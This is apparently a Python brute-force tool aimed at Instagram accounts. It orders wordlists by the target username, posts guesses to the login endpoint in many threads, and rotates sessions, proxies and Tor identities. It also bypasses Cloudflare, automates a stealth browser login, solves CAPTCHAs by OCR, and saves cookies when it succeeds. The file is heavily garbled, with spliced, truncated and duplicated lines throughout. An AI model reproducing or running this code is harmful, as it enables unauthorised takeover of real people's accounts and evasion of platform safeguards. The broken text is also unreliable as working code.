                high_priority.append(password)
            # Medium priority: contains username or common patterns
            elif any(pattern in pwd_lower for pattern in [self.target_username.lower()] + common_patterns):ount based on performance"""
                medium_priority.append(password)
            # Medium priority: simple patterns
            elif len(password) <= 8 and (password.isdigit() or password.isalpha()): g threads: {current_threads} → {new_threads}")
                medium_priority.append(password)
            else: urrent_threads < 20:
                low_priority.append(password)
ing threads: {current_threads} → {new_threads}")
        # Shuffle within categories to avoid patterns
        random.shuffle(high_priority) return current_threads
        random.shuffle(medium_priority)
        random.shuffle(low_priority)r, start_time):
ics"""
        ordered_passwords = high_priority + medium_priority + low_priority
        print(        rate = attempt_number / elapsed if elapsed > 0 else 0
            f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")

        return ordered_passwordsf"   Attempts: {attempt_number:,}/{len(self.password_list):,}")

    def adjust_thread_count(self, current_threads):   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")
        """Dynamically adjust thread count based on performance"""
        if self.rate_limit_count > 10:   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")
            new_threads = max(1, current_threads - 2)
            print(f"🔽 Reducing threads: {current_threads} → {new_threads}")            f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")
            return new_threads
        elif self.rate_limit_count == 0 and current_threads < 20:time):
            new_threads = current_threads + 1
            print(f"🔼 Increasing threads: {current_threads} → {new_threads}")
            return new_threads        total_attempts = self.success_count + self.failed_count + self.checkpoint_count
        return current_threads

    def print_progress_stats(self, attempt_number, start_time):s")
        """Print detailed progress statistics"""s:,}")
        elapsed = time.time() - start_time")
        rate = attempt_number / elapsed if elapsed > 0 else 0
)
        print(f"\n� PROGRESS STATS:")        print(f"⏳ Rate Limits: {self.rate_limit_count}")
        print(f"   Attempts: {attempt_number:,}/{len(self.password_list):,}")
        print(
            f"   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")f"\n🎉 PWNED! Password: {self.found_password}")
        print(
            f"   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")   f"📁 Details saved in: logs/success_{self.target_username}.json")
        print(
            f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")            print(f"\n💔 Target survived the assault")

    def print_final_results(self, start_time):eckpoint_count > 0:
        """Print final attack results"""
        elapsed = time.time() - start_time                f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")
        total_attempts = self.success_count + self.failed_count + self.checkpoint_count

        print(f"\n� HARDCORE ATTACK COMPLETED!")
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")ading proxies from multiple sources...")
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")
        print(f"⏳ Rate Limits: {self.rate_limit_count}")
   'free_configs/proxies.txt'
        if self.found_password:        ]
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(ce in proxy_sources:
                f"📁 Details saved in: logs/success_{self.target_username}.json")
        else:
            print(f"\n💔 Target survived the assault")as f:

        if self.checkpoint_count > 0:xies', [])
            print(s.extend(new_proxies)
                f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")
       f"   Loaded {len(new_proxies)} proxies from {source}")
    def load_proxies(self):
        """Load proxies from multiple sources"""
        print("🌐 Loading proxies from multiple sources...")
        proxies = []f if line.strip()]
        proxy_sources = [s.extend(new_proxies)
            'proxy_list.txt',
            '../proxy_list.txt',oaded {len(new_proxies)} proxies from {source}")
            'config/proxies.json',
            'free_configs/proxies.txt'   Failed to load {source}: {e}")
        ]                continue

        for source in proxy_sources:d some free proxy APIs
            try:
                if source.endswith('.json'):ee_proxies()
                    with open(source, 'r') as f:e_proxies)
                        data = json.load(f)
                        new_proxies = data.get('proxies', [])            print(f"⚠️  Failed to fetch free proxies: {e}")
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")e proxies loaded: {len(unique_proxies)}")
                else:        return unique_proxies
                    with open(source, 'r') as f:
                        new_proxies = [line.strip()
                                       for line in f if line.strip()]e proxies from public APIs"""
                        proxies.extend(new_proxies)ies= []
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")ing free proxies...")
            except Exception as e:
                print(f"   Failed to load {source}: {e}")
                continuenload/api/v1/get?type= http', timeout = 10)

        # Add some free proxy APIs
        try: s.extend([p for p in new_proxies if p.strip()])
            free_proxies= self.fetch_free_proxies()
            proxies.extend(free_proxies) {len(new_proxies)} proxies from proxy-list.download")
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")  Failed to fetch free proxies: {e}")
        return proxies
        unique_proxies= list(set(proxies))  # Remove duplicates
        print(f"✅ Total unique proxies loaded: {len(unique_proxies)}")
        return unique_proxiesation"""

    def fetch_free_proxies(self): range(self.session_pool_size):
        """Fetch free proxies from public APIs"""
        proxies = []d_session()
        try:ppend(session)
            print("🌐 Fetching free proxies...")== 0:
            # ProxyList API
            response = requests.get(ed {i+1}/{self.session_pool_size} sessions...")
                'https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200: {i+1}: {e}")
                new_proxies = response.text.strip().split('\n')fallback
                proxies.extend([p for p in new_proxies if p.strip()])
                print(                self.sessions.append(session)
                    f"   Found {len(new_proxies)} proxies from proxy-list.download")
        except Exception as e:        print(f"✅ Session pool ready: {len(self.sessions)} sessions")
            print(f"⚠️  Failed to fetch free proxies: {e}")
        return proxies
n with stealth features"""
    def create_session_pool(self):        session= requests.Session()
        """Create a pool of sessions for rotation"""
        print("🔄 Creating session pool...")
        for i in range(self.session_pool_size): use_cloudflare_bypass and cloudscraper:
            try:
                session= self.create_advanced_session()meters for cloudscraper
                self.sessions.append(session)
                if i % 10 == 0:
                    print(dom.choice(['windows', 'darwin']),
                        f"   Created {i+1}/{self.session_pool_size} sessions...")   'desktop': True
            except Exception as e:
                print(f"⚠️  Failed to create session {i+1}: {e}")oid errors
                # Create a basic session as fallbackte_scraper(
                session= requests.Session()browser_params,
                self.sessions.append(session)   delay= 10

        print(f"✅ Session pool ready: {len(self.sessions)} sessions")
led, using standard session: 'chrome'")
    def create_advanced_session(self):                session= requests.Session()
        """Create an advanced session with stealth features"""
        session= requests.Session()vanced retry strategy

        # Try to use cloudscraper if availablegy = Retry(
        if self.use_cloudflare_bypass and cloudscraper:
            try:
                # Fix browser parameters for cloudscraper   status_forcelist=[429, 500, 502, 503, 504],
                browser_params = {)
                    'browser': 'chrome',
                    'platform': random.choice(['windows', 'darwin']),
                    'desktop': Truetions= 100, pool_maxsize = 100)
                }
                # Create with simpler parameters to avoid errorsps://", adapter)
                session= cloudscraper.create_scraper(
                    browser=browser_params, print(
                        f"⚠️  Retry strategy setup failed: {e}")
                    delay=10
                )sable SSL warnings
            except Exception as e:
                print(f"⚠️  Cloudscraper failed, using standard session: 'chrome'")gs(urllib3.exceptions.InsecureRequestWarning)
                session= requests.Session()y = False
xception:
        # Advanced retry strategy            pass
        try:
            retry_strategy = Retry(return session
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )ns:

            adapter = HTTPAdapter(max_retries=retry_strategy, return self.sessions[0] if self.sessions else requests.Session()
                                  pool_connections=100, pool_maxsize=100)
            session.mount("http://", adapter)
            session.mount("https://", adapter)ndom proxy - disabled to avoid IPv6 issues"""
        except Exception as e:        return None
            print(f"⚠️  Retry strategy setup failed: {e}")

        # Disable SSL warningset network and system information for advanced fingerprinting"""
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            session.verify= False
        except Exception: f socket else 'Unknown',
            pass
py(),
        return session   'ssl_fingerprint': self.get_ssl_fingerprint()

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions: ️  Network info error: {e}")
            return random.choice(self.sessions) return {}
        return self.sessions[0] if self.sessions else requests.Session()

    def get_proxy(self): et external IP address"""
        """Get a random proxy - disabled to avoid IPv6 issues"""
        return None
meout=5)
    def get_network_info(self):urn response.json().get('ip', 'Unknown')
        """Get network and system information for advanced fingerprinting"""
        try:            return 'Unknown'
            info = {
                'platform': platform.system() if platform else 'Unknown',
                'hostname': socket.gethostname() if socket else 'Unknown',er agent entropy for better randomization"""
                'ip_info': self.get_external_ip(), ua:
                'user_agent_entropy': self.calculate_ua_entropy(), return 0
                'ssl_fingerprint': self.get_ssl_fingerprint()
            }
            return infoing)) / len(ua_string) if ua_string else 0
        except Exception as e: urn round(entropy, 3)
            print(f"⚠️  Network info error: {e}")
            return {} return 0

    def get_external_ip(self):
        """Get external IP address"""enerate SSL fingerprint"""
        try:
            response = requests.get(
                'https://api.ipify.org?format=json', timeout=5)urn hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]
            return response.json().get('ip', 'Unknown')
        except:            return 'unknown'
            return 'Unknown'

    def calculate_ua_entropy(self):reate hash chain for password verification"""
        """Calculate user agent entropy for better randomization"""
        if not self.ua: tr(data).encode())
            return 0urn hash_obj.hexdigest()
        try:
            ua_string = str(self.ua.random) return None
            entropy= len(set(ua_string)) / len(ua_string) if ua_string else 0
            return round(entropy, 3)nations= 50):
        except: ced password combinations using itertools"""
            return 0
            return [base_password]
    def get_ssl_fingerprint(self):
        """Generate SSL fingerprint"""
        try:            combinations = []
            context = ssl.create_default_context()
            return hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]itutions
        except:
            return 'unknown'   'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            }
    def create_hash_chain(self, data):
        """Create hash chain for password verification"""s
        try:
            hash_obj = hashlib.sha256(str(data).encode())[c, substitutions.get(c, c)] for c in chars]):
            return hash_obj.hexdigest()
        except:
            return None
mbinations) >= max_combinations:
    def generate_password_combinations(self, base_password, max_combinations=50):                    break
        """Generate advanced password combinations using itertools"""
        if not itertools:s[:max_combinations]
            return [base_password]
ombination error: {e}")
        try:            return [base_password]
            combinations = []

            # Character substitutions
            substitutions = {OR modules disabled to avoid IPv6 issues")
                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'        return False
            }

            # Generate substitution combinationstity for new IP"""
            chars= list(base_password.lower())r:
            for combo in itertools.product(*[[c, substitutions.get(c, c)] for c in chars]): return False
                new_password= ''.join(combo)
                if new_password != base_password:
                    combinations.append(new_password)t= 9051) as controller:
                if len(combinations) >= max_combinations:
                    break
OR identity rotated")
            return combinations[:max_combinations]
        except Exception as e:
            print(f"⚠️  Password combination error: {e}")TOR rotation failed: {e}")
            return [base_password] return False

    def setup_tor_connection(self): _token, mode = 'web'):
        """Setup TOR connection for advanced anonymity""" login attempt for better performance"""
        print("⚠️  TOR modules disabled to avoid IPv6 issues")
        return False            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token)

    def rotate_tor_identity(self):
        """Rotate TOR identity for new IP"""et_advanced_headers(mode)
        if not Controller:
            return Falsen,

        try:
            with Controller.from_port(port=9051) as controller:n/',
                controller.authenticate()  'Content-Type': 'application/x-www-form-urlencoded'
                controller.signal(Signal.NEWNYM)            })
                print("🔄 TOR identity rotated")
                return True
        except Exception as e:et_username,
            print(f"⚠️  TOR rotation failed: {e}"),
            return False

    async def async_login_attempt(self, session, password, csrf_token, mode='web'):   'trustedDeviceRecords': '{}'
        """Asynchronous login attempt for better performance"""            }
        if not aiohttp:
            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token) as async_session:

        try:tagram.com/accounts/login/ajax/',
            headers = self.get_advanced_headers(mode)
            headers.update({
                'X-CSRFToken': csrf_token,ohttp.ClientTimeout(total=20)
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',                    return self.analyze_response_text(text, password, mode)
                'Content-Type': 'application/x-www-form-urlencoded'
            })
sync error with {password}: {e}")
            login_data = {            return False
                'username': self.target_username,
                'password': password,
                'queryParams': '{}',un sync functions in async context"""
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}' return func(*args)
            }

            async with aiohttp.ClientSession() as async_session: return await loop.run_in_executor(None, func, *args)
                async with async_session.post(
                    'https://www.instagram.com/accounts/login/ajax/', :
                    data=login_data, without response object"""
                    headers=headers,        text_lower = text.lower()
                    timeout=aiohttp.ClientTimeout(total=20)
                ) as response:
                    text = await response.text()
                    return self.analyze_response_text(text, password, mode)   'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
        ]
        except Exception as e:
            print(f"🔄 Async error with {password}: {e}")
            return False
   'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
    async def sync_to_async_wrapper(self, func, *args):        ]
        """Wrapper to run sync functions in async context"""
        if not asyncio:
            return func(*args)
   'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
        loop = asyncio.get_event_loop()        ]
        return await loop.run_in_executor(None, func, *args)

    def analyze_response_text(self, text, password, method):s):
        """Analyze response text without response object"""[{method.upper()}] SUCCESS! Password: {password}")
        text_lower = text.lower()            return True

        # Success indicators
        success_indicators = [cators):
            'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'{method.upper()}] Rate limited for: {password}")
        ]            return None

        # Rate limit indicators
        rate_limit_indicators = [icators):
            'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later')}] Checkpoint for: {password}")
        ]int_count += 1
            return False
        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'method.upper()}] Failed: {password}")
        ]        return False

        # Check for success
        if any(indicator in text_lower for indicator in success_indicators):tem resources for performance optimization"""
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}"):
            return True return {}

        # Check for rate limiting
        if any(indicator in text_lower for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return Nonecent,

        # Check for checkpoint   'network_io': psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
        if any(indicator in text_lower for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1️  Resource monitoring error: {e}")
            return False return {}

        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}") resources"""
        return False        resources = self.get_system_resources()

    def debug_request(self, response, password):, 0) > 80:
        """Debug request details when HTTP 400 or other errors occur"""
        print(f"\n🔍 DEBUG HTTP {response.status_code} - Password: {password}")delay")
        print(f"📊 Status Code: {response.status_code}")t', 0) < 30:
        print(f"📝 Response Headers: {dict(response.headers)}")
            print("🔼 Low CPU usage - decreasing delay")
        try:
            # Show only first 500 characters
            response_text = response.text[:500]
            print(f"📄 Response Body: {response_text}")            print("⚠️  High memory usage detected")

            # Try to parse as JSON if possible        return resources
            if response.headers.get('content-type', '').startswith('application/json'):
                try:
                    response_data = response.json() bypassing advanced detection"""
                    print(f"📋 JSON Response: {response_data}")
                except json.JSONDecodeError: elenium modules not available")
                    print("⚠️ Content-type says JSON but couldn't parse JSON") return False

        except Exception as e:
            print(f"⚠️ Cannot show response body: {e}")

    def save_success(self, password, method, response):
        """Save successful login details"""hm-usage')
        success_data= {
            'username': self.target_username,            options.add_argument('--window-size=1920,1080')
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'cookies': dict(response.cookies),            options.add_argument(f'--user-agent={ua}')
            'response_headers': dict(response.headers)
        }            driver= uc.Chrome(options=options)

        os.makedirs('logs', exist_ok=True)
        with open(f'logs/success_{self.target_username}.json', 'w') as f: m.com/accounts/login /')
            json.dump(success_data, f, indent=2)                time.sleep(random.uniform(2, 4))

    def save_checkpoint(self, password, method, response):
        """Save checkpoint details for manual bypass"""
        checkpoint_data = {EC.presence_of_element_located((By.NAME, "username"))
            'username': self.target_username,
            'password': password,                password_input= driver.find_element(By.NAME, "password")
            'method': method,
            'timestamp': datetime.now().isoformat(),
            # First 1000 chars.target_username)
            'response_text': response.text[:1000]
        }
password)
        os.makedirs('logs', exist_ok=True)                time.sleep(random.uniform(1, 2))
        with open(f'logs/checkpoints_{self.target_username}.json', 'a') as f:
            f.write(json.dumps(checkpoint_data) + '\n')

    def hardcore_brute_force_attack(self, max_threads=10, smart_mode=True): ton[@type = 'submit']")
        """Hardcore brute force attack with all advanced features"""                login_button.click()
        print(f"💀 HARDCORE INSTAGRAM BRUTE FORCE ATTACK")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")                time.sleep(random.uniform(3, 5))
        print(f"🧵 Threads: {max_threads}")
        print(f"🌐 Proxies: {len(self.proxy_list):,}")
        print(f"🔄 Sessions: {len(self.sessions)}")
        print(f"🧠 Smart Mode: {'ON' if smart_mode else 'OFF'}")                page_source= driver.page_source.lower()
        print("=" * 60)

        # Smart password ordering
        if smart_mode: success_indicators):
            self.password_list= self.smart_password_ordering()[SELENIUM] SUCCESS! Password: {password}")

        start_time= time.time()e_source:
        attempt_number= 0kpoint for: {password}")
int_count += 1
        # Create logs directoryeturn False
        os.makedirs('logs', exist_ok=True)
ELENIUM] Failed: {password}")
        with ThreadPoolExecutor(max_workers=max_threads) as executor: return False
            futures= []

            for password in self.password_list:                driver.quit()
                if self.found_password:
                    print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                    breakelenium error with {password}: {e}")
            return False
                future= executor.submit(
                    self.attempt_login_advanced, password, attempt_number)
                futures.append((future, password, attempt_number)) typing patterns"""
                attempt_number += 1

                # Progress reporting            time.sleep(random.uniform(0.05, 0.15))
                if attempt_number % 50 == 0:
                    self.print_progress_stats(attempt_number, start_time)
ternal service"""
                # Dynamic thread adjustment
                if smart_mode and attempt_number % 100 == 0: CAPTCHA solving modules not available")
                    max_threads = self.adjust_thread_count(max_threads) return None

            # Wait for all futures
            for future, password, num in futures:
                if self.found_password: image_to_string(image)
                    break )
                try:
                    future.result(timeout=30) CAPTCHA solving error: {e}")
                except Exception as e: return None
                    print(f"⚠️  Future error for {password}: {e}")

        self.print_final_results(start_time)roxy validation with multiple endpoints"""
        return self.found_password is not None

    def smart_password_ordering(self):at=json',
        """Smart password ordering based on common patterns"""   'https://www.instagram.com'
        print("🧠 Applying smart password ordering...")        ]

        # Common password patterns with priorities        proxy_dict = {'http': proxy, 'https': proxy}
        high_priority = []
        medium_priority = []in test_urls:
        low_priority = []
oxies=proxy_dict, timeout=10)
        username_variations = [tus_code == 200:
            self.target_username, return True
            self.target_username + '123',
            self.target_username + '1',inue
            self.target_username + '2024',        return False
            self.target_username + '2025',
            '123' + self.target_username,
            self.target_username.upper(),ion based on success rate"""
            self.target_username.lower()        working_proxies= []
        ]

        common_patterns= [st first 20 proxies
            'password', '123456', 'password123', 'admin', 'qwerty', y):
            'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]rint(f"✅ Working proxy: {proxy}")

        for password in self.password_list: print(f"❌ Dead proxy: {proxy}")
            pwd_lower= password.lower()

            # High priority: username variations        print(f"✅ Validated {len(working_proxies)} working proxies")
            if password in username_variations:
                high_priority.append(password)
            # High priority: very common passwordslistic device fingerprint"""
            elif pwd_lower in ['123456', 'password', 'qwerty', '123456789']:
                high_priority.append(password)8', '1440x900', '1536x864']),
            # Medium priority: contains username or common patterns
            elif any(pattern in pwd_lower for pattern in [self.target_username.lower()] + common_patterns):
                medium_priority.append(password)e(['Win32', 'MacIntel', 'Linux x86_64']),
            # Medium priority: simple patterns
            elif len(password) <= 8 and (password.isdigit() or password.isalpha()):
                medium_priority.append(password)   'canvas_fingerprint': hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
            else:
                low_priority.append(password) return fingerprint

        # Shuffle within categories to avoid patterns:
        random.shuffle(high_priority)
        random.shuffle(medium_priority)        fingerprint= self.generate_device_fingerprint()
        random.shuffle(low_priority)
s
        ordered_passwords= high_priority + medium_priority + low_priority
        print(l; q=0.9, image/webp, */*; q=0.8',
            f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")e'] + ', en; q= 0.5',

        return ordered_passwordsdo_not_track'] else '0',

    def adjust_thread_count(self, current_threads):  'Upgrade-Insecure-Requests': '1',
        """Dynamically adjust thread count based on performance"""})
        if self.rate_limit_count > 10:
            new_threads = max(1, current_threads - 2) return session
            print(f"🔽 Reducing threads: {current_threads} → {new_threads}")
            return new_threads
        elif self.rate_limit_count == 0 and current_threads < 20:
            new_threads= current_threads + 1ce...")
            print(f"🔼 Increasing threads: {current_threads} → {new_threads}")        network_info= self.get_network_info()
            return new_threads
        return current_threads
f"🌐 External IP: {network_info.get('ip_info', 'Unknown')}")
    def print_progress_stats(self, attempt_number, start_time):
        """Print detailed progress statistics"""own')}")
        elapsed = time.time() - start_time print(f"🎭 UA Entropy: {network_info.get('user_agent_entropy', 0)}")
        rate= attempt_number / elapsed if elapsed > 0 else 0
        return network_info
        print(f"\n� PROGRESS STATS:")
        print(f"   Attempts: {attempt_number:,}/{len(self.password_list):,}")
        print(le wordlists for comprehensive attack"""
            f"   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")
        print(
            f"   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")
        print(
            f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")',
txt',
    def print_final_results(self, start_time):   'wordlists/social_media.txt'
        """Print final attack results"""        ]
        elapsed = time.time() - start_time
        total_attempts = self.success_count + self.failed_count + self.checkpoint_countce in wordlist_sources:

        print(f"\n� HARDCORE ATTACK COMPLETED!") f:
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")or line in f if line.strip()]
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}") print(f"✅ Loaded {len(passwords)} passwords from {source}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")                continue
        print(f"⏳ Rate Limits: {self.rate_limit_count}")
        return list(set(wordlists))  # Remove duplicates
        if self.found_password:
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(ord mutations using advanced techniques"""
                f"📁 Details saved in: logs/success_{self.target_username}.json")        mutations= set()
        else:
            # Limit to prevent memory issues
            print(f"\n💔 Target survived the assault")passwords[:100]:

        if self.checkpoint_count > 0:
            print(
                f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")            mutations.add(password.capitalize())

    def load_proxies(self):
        """Load proxies from multiple sources"""
        print("🌐 Loading proxies from multiple sources..."))
        proxies= []            mutations.add('123' + password)
        proxy_sources= [
            'proxy_list.txt', er substitutions
            '../proxy_list.txt',
            'config/proxies.json',   'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
            'free_configs/proxies.txt'}
        ]

        for source in proxy_sources:
            try: replace(old, new)
                if source.endswith('.json'):            mutations.add(mutated)
                    with open(source, 'r') as f:
                        data= json.load(f)
                        new_proxies= data.get('proxies', [])            mutations.add(password[::-1])
                        proxies.extend(new_proxies)
                        print(
                            f"   Loaded {len(new_proxies)} proxies from {source}")123', '2025', '2024']:
                else:                mutations.add(password + ending)
                    with open(source, 'r') as f:
                        new_proxies = [line.strip() return list(mutations)
                                       for line in f if line.strip()]
                        proxies.extend(new_proxies)ername):
                        print(heck if Instagram user exists"""
                            f"   Loaded {len(new_proxies)} proxies from {source}")
            except Exception as e:
                print(f"   Failed to load {source}: {e}")/{username}/', timeout=10)
                continue
xt:
        # Add some free proxy APIsser {username} exists")
        try:
            free_proxies = self.fetch_free_proxies()er {username} does not exist")
            proxies.extend(free_proxies)urn False
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")
            return True  # Assume exists to continue attack
        unique_proxies = list(set(proxies))  # Remove duplicates
        print(f"✅ Total unique proxies loaded: {len(unique_proxies)}")
        return unique_proxiesuick check if the Instagram user exists"""

    def fetch_free_proxies(self):
        """Fetch free proxies from public APIs"""            url=f'https://www.instagram.com/{self.target_username}/'
        proxies=[]
        try:            response=session.get(url, headers=headers, timeout=15)
            print("🌐 Fetching free proxies...")
            # ProxyList APItus_code == 200:
            response=requests.get(
                'https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200: er {self.target_username} does not exist")
                new_proxies= response.text.strip().split('\n')eturn False
                proxies.extend([p for p in new_proxies if p.strip()])
                print(
                    f"   Found {len(new_proxies)} proxies from proxy-list.download")er existence check failed with status {response.status_code}")
        except Exception as e:
            print(f"⚠️  Failed to fetch free proxies: {e}")
        return proxiesError checking user existence: {e}")
            return None
    def create_session_pool(self):
        """Create a pool of sessions for rotation""":
        print("🔄 Creating session pool...")ore thorough check if the user exists"""
        for i in range(self.session_pool_size):
            try:
                session = self.create_advanced_session()            headers = self.get_advanced_headers('web')
                self.sessions.append(session)
                if i % 10 == 0:specific headers
                    print(
                        f"   Created {i+1}/{self.session_pool_size} sessions..."),
            except Exception as e:  'X-Instagram-AJAX': '1006179778'
                print(f"⚠️  Failed to create session {i+1}: {e}")            })
                # Create a basic session as fallback
                session = requests.Session()            url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}'
                self.sessions.append(session)
            response = session.get(url, headers=headers, timeout=20)
        print(f"✅ Session pool ready: {len(self.sessions)} sessions")
rse response
    def create_advanced_session(self):
        """Create an advanced session with stealth features"""
        session = requests.Session()atus') == 'ok' and data.get('data', {}).get('user'):
eturn True
        # Try to use cloudscraper if available
        if self.use_cloudflare_bypass and cloudscraper: return False
            try:
                # Fix browser parameters for cloudscraper
                browser_params = { followed may be broken' in response.text:
                    'browser': 'chrome',
                    'platform': random.choice(['windows', 'darwin']),s page' in response.text:
                    'desktop': True
                }t_username in response.text:
                # Create with simpler parameters to avoid errors                    return True
                session = cloudscraper.create_scraper(
                    browser=browser_params,Ambiguous user existence response, proceeding anyway")
                    delay=10
                )
            except Exception as e: failed: {e}")
                print(f"⚠️  Cloudscraper failed, using standard session: 'chrome'")o True to continue the attack
                session = requests.Session()            return True

























































































































































































































        return False        print(f"❌ [{method.upper()}] Failed: {password}")        # Regular failure            return False            self.checkpoint_count += 1            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")        if any(indicator in text_lower for indicator in checkpoint_indicators):        # Check for checkpoint            return None            print(f"⏳ [{method.upper()}] Rate limited for: {password}")        if any(indicator in text_lower for indicator in rate_limit_indicators):        # Check for rate limiting            return True            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")        if any(indicator in text_lower for indicator in success_indicators):        # Check for success        ]            'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'        checkpoint_indicators = [        # Checkpoint indicators        ]            'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'        rate_limit_indicators = [        # Rate limit indicators        ]            'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'        success_indicators = [        # Success indicators        text_lower = text.lower()        """Analyze response text without response object"""    def analyze_response_text(self, text, password, method):        return await loop.run_in_executor(None, func, *args)        loop = asyncio.get_event_loop()            return func(*args)        if not asyncio:        """Wrapper to run sync functions in async context"""    async def sync_to_async_wrapper(self, func, *args):            return False            print(f"🔄 Async error with {password}: {e}")        except Exception as e:                    return self.analyze_response_text(text, password, mode)                    text = await response.text()                ) as response:                    timeout=aiohttp.ClientTimeout(total=20)                    headers=headers,                    data=login_data,                    'https://www.instagram.com/accounts/login/ajax/',                async with async_session.post(            async with aiohttp.ClientSession() as async_session:            }                'trustedDeviceRecords': '{}'                'optIntoOneTap': 'false',                'queryParams': '{}',                'password': password,                'username': self.target_username,            login_data = {            })                'Content-Type': 'application/x-www-form-urlencoded'                'Referer': 'https://www.instagram.com/accounts/login/',                'X-Requested-With': 'XMLHttpRequest',                'X-Instagram-AJAX': '1',                'X-CSRFToken': csrf_token,            headers.update({            headers = self.get_advanced_headers(mode)        try:            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token)        if not aiohttp:        """Asynchronous login attempt for better performance"""    async def async_login_attempt(self, session, password, csrf_token, mode='web'):            return False            print(f"⚠️  TOR rotation failed: {e}")        except Exception as e:                return True                print("🔄 TOR identity rotated")                controller.signal(Signal.NEWNYM)                controller.authenticate()            with Controller.from_port(port=9051) as controller:        try:            return False        if not Controller:        """Rotate TOR identity for new IP"""    def rotate_tor_identity(self):        return False        print("⚠️  TOR modules disabled to avoid IPv6 issues")        """Setup TOR connection for advanced anonymity"""    def setup_tor_connection(self):            return [base_password]            print(f"⚠️  Password combination error: {e}")        except Exception as e:            return combinations[:max_combinations]                    break                if len(combinations) >= max_combinations:                    combinations.append(new_password)                if new_password != base_password:                new_password = ''.join(combo)            for combo in itertools.product(*[[c, substitutions.get(c, c)] for c in chars]):            chars = list(base_password.lower())            # Generate substitution combinations            }                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'            substitutions = {            # Character substitutions            combinations = []        try:            return [base_password]        if not itertools:        """Generate advanced password combinations using itertools"""    def generate_password_combinations(self, base_password, max_combinations=50):            return None        except:            return hash_obj.hexdigest()            hash_obj = hashlib.sha256(str(data).encode())        try:        """Create hash chain for password verification"""    def create_hash_chain(self, data):            return 'unknown'        except:            return hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]            context = ssl.create_default_context()        try:        """Generate SSL fingerprint"""    def get_ssl_fingerprint(self):            return 0        except:            return round(entropy, 3)            entropy = len(set(ua_string)) / len(ua_string) if ua_string else 0            ua_string = str(self.ua.random)        try:            return 0        if not self.ua:        """Calculate user agent entropy for better randomization"""    def calculate_ua_entropy(self):            return 'Unknown'        except:            return response.json().get('ip', 'Unknown')                'https://api.ipify.org?format=json', timeout=5)            response = 